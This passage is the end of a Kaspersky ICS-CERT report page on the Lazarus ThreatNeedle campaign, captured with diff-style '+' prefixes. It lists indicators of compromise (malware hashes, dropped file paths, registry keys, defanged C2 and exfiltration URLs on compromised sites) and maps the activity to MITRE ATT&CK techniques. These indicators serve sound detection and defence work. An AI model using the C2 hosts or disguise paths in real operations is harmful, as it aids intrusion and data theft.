+69d71f06fbfe177fb1a5f57b9c3ae587    %APPDATA%\Microsoft\Windows\shsvcs.db
+7bad67dcaf269f9ee18869e5ef6b2dc1    
+956e5138940a4f44d1c2c24f122966bd    %APPDATA%\ntuser.bin</pre>
+
+
+
+<p><strong>Loader</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ed627b7bbf7ea78c343e9fb99783c62b    
+1a17609b7df20dcb3bd1b71b7cb3c674    %ALLUSERSPROFILE%\ntuser.bin
+fa9635b479a79a3e3fba3d9e65b842c3    
+3758bda17b20010ff864575b0ccd9e50    %SYSTEMROOT%\system\mraudio.drv   	 
+cbcf15e272c422b029fcf1b82709e333    %SYSTEMROOT%\system\mraudio.drv
+9cb513684f1024bea912e539e482473a    
+9cb513684f1024bea912e539e482473a    
+36ab0902797bd18acd6880040369731c    %SYSTEMROOT%\LogonHours.sys
+db35391857bcf7b0fa17dbbed97ad269    %ALLUSERSPROFILE%\Adobe\update.tmp
+be4c927f636d2ae88a1e0786551bf3c4    %ALLUSERSPROFILE%\Adobe\unpack.tmp
+728948c66582858f6a3d3136c7fbe84a    %APPDATA%\Microsoft\IBM.DAT
+06af39b9954dfe9ac5e4ec397a3003fb    
+29c5eb3f17273383782c716754a3025a    
+79d58b6e850647024fea1c53e997a3f6    
+e604185ee40264da4b7d10fdb6c7ab5e    
+2a73d232334e9956d5b712cc74e01753    
+1a17609b7df20dcb3bd1b71b7cb3c674    %ALLUSERSPROFILE%\ntuser.bin
+459be1d21a026d5ac3580888c8239b07    %ALLUSERSPROFILE%\ntuser.bin
+87fb7be83eff9bea0d6cc95d68865564    %SYSTEMROOT%\SysWOW64\wmdmpmsp.sys
+062a40e74f8033138d19aa94f0d0ed6e    %APPDATA%\microsoft\OutIook.db
+9b17f0db7aeff5d479eaee8056b9ac09    %TEMP%\ETS4658.tmp, %APPDATA%\Temp\BTM0345.tmp
+9b17f0db7aeff5d479eaee8056b9ac09    %APPDATA%\Temp\BTM0345.tmp
+420d91db69b83ac9ca3be23f6b3a620b    
+238e31b562418c236ed1a0445016117c    %APPDATA%\Microsoft\Windows\lconcaches.db, %TEMP%\cache.db
+36ab0902797bd18acd6880040369731c    
+238e31b562418c236ed1a0445016117c    %TEMP%\cache.db, %APPDATA%\Microsoft\Windows\lconcaches.db
+ad1a93d6e6b8a4f6956186c213494d17    %APPDATA%\Microsoft\Windows\shsvcs.db
+c34d5d2cc857b6ee9038d8bb107800f1    </pre>
+
+
+
+<p><strong>Registry Loader</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">16824dfd4a380699f3841a6fa7e52c6d    
+aa74ed16b0057b31c835a5ef8a105942    
+85621411e4c80897c588b5df53d26270    %SYSTEMROOT%\system\avimovie.dll
+a611d023dfdd7ca1fab07f976d2b6629    
+160d0e396bf8ec87930a5df46469a960    %WINDIR%\winhelp.dll
+110e1c46fd9a39a1c86292487994e5bd	</pre>
+
+
+
+<p><strong>Downloader</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ac86d95e959452d189e30fa6ded05069    %APPDATA%\Microsoft\thumbnails.db</pre>
+
+
+
+<p><strong>Trojanized VNC Uploader</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bea90d0ef40a657cb291d25c4573768d    %ALLUSERSPROFILE%\adobe\arm86.dat	 
+254a7a0c1db2bea788ca826f4b5bf51a    %APPDATA%\PBL\user.tmp, %APPDATA%\Comms\Comms.dat</pre>
+
+
+
+<p><strong>Tunneling Tool</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">6f0c7cbd57439e391c93a2101f958ccd    %APPDATA\PBL\update.tmp
+fc9e7dc13ce7edc590ef7dfce12fe017</pre>
+
+
+
+<p><strong>LPEClient</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">0aceeb2d38fe8b5ef2899dd6b80bfc08    %TEMP%\ETS5659.tmp
+09580ea6f1fe941f1984b4e1e442e0a5    %TEMP%\ETS4658.tmp</pre>
+
+
+
+<p><strong>File path</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">%SYSTEMROOT%\system32\bcdbootinfo.tlp
+%SYSTEMROOT%\system32\Nwsapagent.sys
+%SYSTEMROOT%\system32\SRService.sys
+%SYSTEMROOT%\system32\NWCWorkstation.sys
+%SYSTEMROOT%\system32\WmdmPmSp.sys
+%SYSTEMROOT%\system32\PCAudit.sys
+%SYSTEMROOT%\system32\helpsvc.sys</pre>
+
+
+
+<p><strong>Registry Path</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\GameConfig - Description
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig - SubVersion</pre>
+
+
+
+<p><strong>Domains and IPs</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">hxxp://forum.iron-maiden[.]ru/core/cache/index[.]php
+hxxp://www.au-pair[.]org/admin/Newspaper[.]asp
+hxxp://www.au-pair[.]org/admin/login[.]asp
+hxxp://www.colasprint[.]com/_vti_log/upload[.]asp
+hxxp://www.djasw.or[.]kr/sub/popup/images/upfiles[.]asp
+hxxp://www.kwwa[.]org/popup/160307/popup_160308[.]asp
+hxxp://www.kwwa[.]org/DR6001/FN6006LS[.]asp
+hxxp://www.sanatoliacare[.]com/include/index[.]asp
+hxxps://americanhotboats[.]com/forums/core/cache/index[.]php
+hxxps://docentfx[.]com/wp-admin/includes/upload[.]php
+hxxps://kannadagrahakarakoota[.]org/forums/admincp/upload[.]php
+hxxps://polyboatowners[.]com/2010/images/BOTM/upload[.]php
+hxxps://ryanmcbain[.]com/forum/core/cache/upload[.]php
+hxxps://shinwonbook.co[.]kr/basket/pay/open[.]asp
+hxxps://shinwonbook.co[.]kr/board/editor/upload[.]asp
+hxxps://theforceawakenstoys[.]com/vBulletin/core/cache/upload[.]php
+hxxps://www.automercado.co[.]cr/empleo/css/main[.]jsp
+hxxps://www.curiofirenze[.]com/include/inc-site[.]asp
+hxxps://www.digitaldowns[.]us/artman/exec/upload[.]php
+hxxps://www.digitaldowns[.]us/artman/exec/upload[.]php    
+hxxps://www.dronerc[.]it/forum/uploads/index[.]php
+hxxps://www.dronerc[.]it/shop_testbr/Adapter/Adapter_Config[.]php
+hxxps://www.edujikim[.]com/intro/blue/view[.]asp
+hxxps://www.edujikim[.]com/pay/sample/INIstart[.]asp
+hxxps://www.edujikim[.]com/smarteditor/img/upload[.]asp
+hxxps://www.fabioluciani[.]com/ae/include/constant[.]asp
+hxxps://www.fabioluciani[.]com/es/include/include[.]asp
+hxxp://www.juvillage.co[.]kr/img/upload[.]asp
+hxxps://www.lyzeum[.]com/board/bbs/bbs_read[.]asp
+hxxps://www.lyzeum[.]com/images/board/upload[.]asp
+hxxps://martiancartel[.]com/forum/customavatars/avatars[.]php
+hxxps://www.polyboatowners[.]com/css/index[.]php
+hxxps://www.sanlorenzoyacht[.]com/newsl/include/inc-map[.]asp
+hxxps://www.raiestatesandbuilders[.]com/admin/installer/installer/index[.]php
+hxxp://156.245.16[.]55/admin/admin[.]asp
+hxxp://fredrikarnell[.]com/marocko2014/index[.]php
+hxxp://roit.co[.]kr/xyz/mainpage/view[.]asp
+</pre>
+
+
+
+<p><strong>Second stage C2 address</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">hxxps://www.waterdoblog[.]com/uploads/index[.]asp
+hxxp://www.kbcwainwrightchallenge.org[.]uk/connections/dbconn[.]asp</pre>
+
+
+
+<p><strong>C2 URLs to exfiltrate files used by Trojanized VNC Uploader</strong></p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="raw" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">hxxps://prototypetrains[.]com:443/forums/core/cache/index[.]php
+hxxps://newidealupvc[.]com:443/img/prettyPhoto/jquery.max[.]php
+hxxps://mdim.in[.]ua:443/core/cache/index[.]php
+hxxps://forum.snowreport[.]gr:443/cache/template/upload[.]php
+hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp
+hxxps://www.dellarocca[.]net/it/content/img/img[.]asp
+hxxps://www.astedams[.]it/photos/image/image[.]asp
+hxxps://www.geeks-board[.]com/blog/wp-content/uploads/2017/cache[.]php
+hxxps://cloudarray[.]com/images/logo/videos/cache[.]jsp</pre>
+
+
+
+<h2 id="_Toc64638332">Appendix II – MITRE ATT&amp;CK Mapping</h2>
+
+
+
+<table>
+<thead>
+  <tr>
+    <th>Tactic</th>
+    <th>Technique</th>
+    <th>Technique Name</th>
+  </tr>
+</thead>
+<tbody>
+  <tr>
+    <td>Initial Access</td>
+    <td>T1566.002</td>
+    <td>Phishing: Spearphishing Link</td>
+  </tr>
+  <tr>
+    <td rowspan="3">Execution</td>
+    <td>T1059.003</td>
+    <td>Command and Scripting Interpreter: Windows Command Shell</td>
+  </tr>
+  <tr style="background-color:#f6f6f6">
+    <td>T1204.002</td>
+    <td>User Execution: Malicious File</td>
+  </tr>
+  <tr>
+    <td>T1569.002</td>
+    <td>System Services: Service Execution</td>
+  </tr>
+  <tr>
+    <td rowspan="2">Persistence</td>
+    <td>T1543.003</td>
+    <td>Create or Modify System Process: Windows Service</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1547.001</td>
+    <td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
+  </tr>
+  <tr style="background-color:#f6f6f6">
+    <td>Privilege Escalation</td>
+    <td>T1543.003</td>
+    <td>Create or Modify System Process: Windows Service</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td rowspan="7">Defense Evasion</td>
+    <td>T1140</td>
+    <td>Deobfuscate/Decode Files or Information</td>
+  </tr>
+  <tr>
+    <td>T1070.002</td>
+    <td>Clear Linux or Mac System Logs</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1070.003</td>
+    <td>Clear Command History</td>
+  </tr>
+  <tr>
+    <td>T1070.004</td>
+    <td>File Deletion</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1036.003</td>
+    <td>Masquerading: Rename System Utilities</td>
+  </tr>
+  <tr>
+    <td>T1036.004</td>
+    <td>Masquerading: Masquerade Task or Service</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1112</td>
+    <td>Modify Registry</td>
+  </tr>
+  <tr style="background-color:#f6f6f6">
+    <td>Credential Access</td>
+    <td>T1557.001</td>
+    <td>LLMNR/NBT-NS Poisoning and   SMB Relay</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td rowspan="8">Discovery</td>
+    <td>T1135</td>
+    <td>Network Share Discovery</td>
+  </tr>
+  <tr>
+    <td>T1057</td>
+    <td>Process Discovery</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1016</td>
+    <td>System Network Configuration Discovery</td>
+  </tr>
+  <tr>
+    <td>T1033</td>
+    <td>System Owner/User Discovery</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1049</td>
+    <td>System Network Connections Discovery</td>
+  </tr>
+  <tr>
+    <td>T1082</td>
+    <td>System Information Discovery</td>
+  </tr>
+  <tr style="background-color:#e9e9e9">
+    <td>T1083</td>
+    <td>File and Directory Discovery</td>
+  </tr>
+  <tr>
+    <td>T1007</td>
+    <td>System Service Discovery</td>
+  </tr>
+  <tr>
+    <td>Lateral Movement</td>
+    <td>T1021.002</td>
+    <td>SMB/Windows Admin Shares</td>
+  </tr>
+  <tr>
+    <td>Collection</td>
+    <td>T1560.001</td>
+    <td>Archive Collected Data: Archive via Utility</td>
+  </tr>
+  <tr>
+    <td rowspan="5">Command and Control</td>
+    <td>T1071.001</td>
+    <td>Application Layer Protocol: Web Protocols</td>
+  </tr>
+  <tr style="background-color:#f6f6f6">
+    <td>T1132.002</td>
+    <td>Non-Standard Encoding</td>
+  </tr>
+  <tr>
+    <td>T1104</td>
+    <td>Multi-Stage Channels</td>
+  </tr>
+  <tr style="background-color:#f6f6f6">
+    <td>T1572</td>
+    <td>Protocol Tunneling</td>
+  </tr>
+  <tr>
+    <td>T1090.001</td>
+    <td>Internal Proxy</td>
+  </tr>
+  <tr>
+    <td>Exfiltration</td>
+    <td>T1041</td>
+    <td>Exfiltration Over C2 Channel</td>
+  </tr>
+</tbody>
+</table>
+
+
+
+<p></p>
+											<a class="content_blog-link -pdf -mt" href="/media/Kaspersky-ICS-CERT-Lazarus-targets-defense-industry-with-Threatneedle-En.pdf" target="_blank">Download PDF version</a>
+									</article>
+			</div>
+							<div class="author-list">
+																	<div class="author-list_item">
+							<div class="author-list_col author-list_col--photo">
+								<img class="author-list_photo" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2018/07/vkopeytsev.jpg" alt="Vyacheslav Kopeytsev" title="Vyacheslav Kopeytsev" />
+							</div>
+
+							<div class="author-list_col author-list_col--content">
+								<h4 class="author-list_name">Vyacheslav Kopeytsev</h4>
+								<h5 class="author-list_role">Senior Security Researcher</h5>
+							</div>
+						</div>
+																	<div class="author-list_item">
+							<div class="author-list_col author-list_col--photo">
+								<img class="author-list_photo" src="https://ics-cert.kaspersky.com/wp-content/uploads/sites/6/2021/02/spark.jpg" alt="Seongsu Park" title="Seongsu Park" />
+							</div>
+
+							<div class="author-list_col author-list_col--content">
+								<h4 class="author-list_name">Seongsu Park</h4>
+								<h5 class="author-list_role">Senior Security Researcher</h5>
+							</div>
+						</div>
+									</div>
+					</div>
+
+		<div class="col-33 col-sm-100">
+			<div class="two-columns_report two-columns_report--d-inline-block two-columns_report--mb">
+				<div class="blog_social">
+					<a href="https://www.facebook.com/share.php?u=https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/" class="blog_social-item blog_social-item--fb"></a>
+					<a href="https://twitter.com/intent/tweet?text=Lazarus targets defense industry with ThreatNeedle&url=https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/" class="blog_social-item blog_social-item--tw"></a>
+					<a href="https://plus.google.com/share?url={https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/}" class="blog_social-item blog_social-item--gplus"></a>
+					<a href="mailto:?subject=Shared%20from%ICS%CERT&body=https://ics-cert.kaspersky.com/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/" class="blog_social-item blog_social-item--mail"></a>
+				</div>
+			</div>
+
+			
+													<div class="two-columns_report two-columns_report--d-inline-block two-columns_report--mb">
+						<div class="two-columns_report-title">Reports</div>
+
+													<a href="https://ics-cert.kaspersky.com/reports/2021/05/21/darkchronicles-the-consequences-of-the-colonial-pipeline-attack/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no blog_item--pt-no">
+								<p class="blog_subtitle blog_subtitle--mb-min blog_link">DarkChronicles: the consequences of the Colonial Pipeline attack</p>
+								<p class="blog_time blog_time--grey blog_time--mbottom">21 May 2021</p>
+							</a>
+
+																				<a href="https://ics-cert.kaspersky.com/reports/2021/04/07/vulnerability-in-fortigate-vpn-servers-is-exploited-in-cring-ransomware-attacks/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no">
+								<p class="blog_subtitle blog_subtitle--mb-min blog_link">Vulnerability in FortiGate VPN servers is exploited in Cring ransomware attacks</p>
+								<p class="blog_time blog_time--grey blog_time--mbottom">07 April 2021</p>
+							</a>
+
+																				<a href="https://ics-cert.kaspersky.com/reports/2021/03/29/apt-attacks-on-industrial-companies-in-2020/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no">
+								<p class="blog_subtitle blog_subtitle--mb-min blog_link">APT attacks on industrial companies in 2020</p>
+								<p class="blog_time blog_time--grey blog_time--mbottom">29 March 2021</p>
+							</a>
+
+																		</div>
+				
+																				<div class="two-columns_report two-columns_report--d-inline-block two-columns_report--mb">
+							<div class="two-columns_report-title">News</div>
+																							<a href="https://ics-cert.kaspersky.com/news/2021/03/31/good-old-buffer-overflow/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no blog_item--pt-no">
+									<p class="blog_subtitle blog_subtitle--mb-min blog_link">Good old buffer overflow</p>
+									<p class="blog_time blog_time--grey blog_time--mbottom">31 March 2021</p>
+								</a>
+
+																															<a href="https://ics-cert.kaspersky.com/news/2021/03/30/network-asset-traversal-or-natural-disaster-nat-slipstreaming-2-0/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no">
+									<p class="blog_subtitle blog_subtitle--mb-min blog_link">Network Asset Traversal or NATural disaster: NAT Slipstreaming 2.0</p>
+									<p class="blog_time blog_time--grey blog_time--mbottom">30 March 2021</p>
+								</a>
+
+																															<a href="https://ics-cert.kaspersky.com/news/2021/03/04/more-critical-vulnerabilities-identified-in-opc-protocol-implementations/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no">
+									<p class="blog_subtitle blog_subtitle--mb-min blog_link">More critical vulnerabilities identified in OPC protocol implementations</p>
+									<p class="blog_time blog_time--grey blog_time--mbottom">04 March 2021</p>
+								</a>
+
+																					</div>
+															<div class="two-columns_report two-columns_report--d-inline-block two-columns_report--mb">
+							<div class="two-columns_report-title">Alerts</div>
+																							<a href="https://ics-cert.kaspersky.com/alerts/2020/06/17/targeted-attacks-on-industrial-companies-using-snake-ransomware/" class="blog_item blog_item--no-border blog_item--pb-no blog_item--pt-no blog_item--pt-no">
+									<p class="blog_subtitle blog_subtitle--mb-min blog_link">Targeted attacks on industrial companies using Snake ransomware (updated)</p>
+									<p class="blog_time blog_time--grey blog_time--mbottom">17 June 2020</p>
+								</a>
+
+																					</div>
+				
+							<div class="two-columns_report two-columns_report--d-inline-block two-columns_report--mb">
+					<ul class="blog_tag-list">
+													<li class="blog_tag-item"><a href="/tag/covid-19/">COVID-19</a></li>
+													<li class="blog_tag-item"><a href="/tag/lazarus/">Lazarus</a></li>
+													<li class="blog_tag-item"><a href="/tag/threatneedle/">ThreatNeedle</a></li>
+											</ul>
+				</div>
+					</div>
+	</div>
+		</div>
+	</div>
+		<footer class="footer">
+			<div class="page-main_inner">
+				<div class="col-33 col-sm-100">
+					<div class="footer_logo">
+													<a href="https://ics-cert.kaspersky.com/KICSCERT-57DDD676-public.asc" class="footer_link -block footer_link--key">
+								Download PGP/GPG key							</a>
+																			<a href="https://www.kaspersky.com/web-privacy-policy" class="footer_link -block">
+																Privacy policy							</a>
+						<p>© АО Kaspersky Lab, 1997 - 2021</p>
+					</div>
+				</div>
+				<div class="col-33 col-sm-100">
+
+				</div>
+				<div class="col-33 col-sm-100">
+					<div class="footer_social">
+						<a class="footer_link" style="margin-right: 25px;" href="https://www.sei.cmu.edu/education-outreach/computer-security-incident-response-teams/
+authorized-users/index.cfm"><img src="https://www.sei.cmu.edu/sei-images/images/CERT_Authorized_
+Use_identifier.jpg" width="180" height="50" border="0" alt="Authorized to Use CERT(TM) CERT is a mark
+owned by Carnegie Mellon University" /></a>
+						<a class="footer_link footer_link--icon-kas" href="http://www.kaspersky.ru/" target="_blank"></a>
+					</div>
+				</div>
+			</div>
+		</footer>
+					<div class="notification">
+				<div class="content_inner">
+					<form action="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/ajax/cookie-usage.php" class="notification_form js-cookie-notification" method="post">
+						<input type="hidden" id="_wpnonce" name="_wpnonce" value="c9c1ca3666" /><input type="hidden" name="_wp_http_referer" value="/reports/2021/02/25/lazarus-targets-defense-industry-with-threatneedle/" />						<input type="hidden" name="agree" value="true">
+						<div class="notification_description">
+							<p>We use cookies to make your experience of our websites better. By using and further navigating this website you accept this. Detailed information about the use of cookies on this website is available by clicking on <a class="external-link" href="https://www.kaspersky.com/web-privacy-policy" rel="nofollow">more information</a>.</p>
+						</div>
+						<button class="notification_btn btn" type="submit">Accept and Close</button>
+					</form >
+				</div>
+			</div>
+		
+		<!-- <script src="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/assets/js/jquery.js?v=1"></script> -->
+		<script src="https://ics-cert.kaspersky.com/wp-content/themes/ics_theme/assets/js/all.js?v=1.26"></script>
+
+		<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88685013-1', 'auto');
+  ga('send', 'pageview');
+
+</script>		<script type='text/javascript' src='https://ics-cert.kaspersky.com/wp-content/plugins/enlighter/cache/X6_enlighterjs.min.js?ver=DybqQ/EH2HuUsHG' id='enlighterjs-js'></script>
+<script type='text/javascript' id='enlighterjs-js-after'>
+!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
+</script>
+<script type='text/javascript' src='https://ics-cert.kaspersky.com/wp-includes/js/wp-embed.min.js?ver=5.7.2' id='wp-embed-js'></script>
+<script type='text/javascript' src='https://cdn.onesignal.com/sdks/OneSignalSDK.js?ver=5.7.2' async='async' id='remote_sdk-js'></script>
+	</body>
+</html>
+<!--
+Performance optimized by W3 Total Cache. Learn more: https://www.boldgrid.com/w3-total-cache/
+
+Object Caching 171/217 objects using disk
+Page Caching using disk: enhanced 
+Database Caching 17/47 queries in 0.058 seconds using disk
+
+Served from: ics-cert.kaspersky.com @ 2021-08-26 21:54:46 by W3 Total Cache
+-->
